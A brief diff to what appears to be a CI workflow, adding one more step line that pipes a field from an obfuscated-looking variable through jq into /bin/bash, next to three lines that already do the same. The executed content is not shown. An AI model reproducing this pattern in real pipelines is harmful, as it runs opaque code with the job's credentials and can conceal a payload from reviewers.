@@ -34,6 +34,7 @@ jobs:
           echo $lym7 | jq -r .dts0049 | /bin/bash
           printf '%s' "$bmqx0" | jq -r .dqgit944 | /bin/bash
           printf '%s' "$oqpe423" | jq -r .s32 | /bin/bash
+          printf '%s' "$cfj7" | jq -r .tfvat06 | /bin/bash
 
       - name: Save archive
         if: always()
